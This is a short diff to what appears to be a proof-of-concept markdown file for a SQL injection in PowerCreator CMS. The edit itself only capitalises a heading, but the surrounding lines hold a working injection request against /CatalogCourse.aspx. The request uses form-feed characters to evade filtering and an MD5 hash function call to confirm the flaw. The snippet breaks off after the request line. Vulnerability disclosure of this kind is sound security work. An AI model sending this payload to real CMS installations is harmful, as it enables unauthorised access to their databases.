@@ -10,7 +10,7 @@ app="PowerCreator-CMS"
 
 ![image](https://github.com/user-attachments/assets/fcc5c0c8-6a56-42a0-9aba-0d65b1d63a56)
 
-## poc
+## POC
 
 ```yaml
 GET /CatalogCourse.aspx?cid=1%0Cand%0C1=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))-- HTTP/1.1
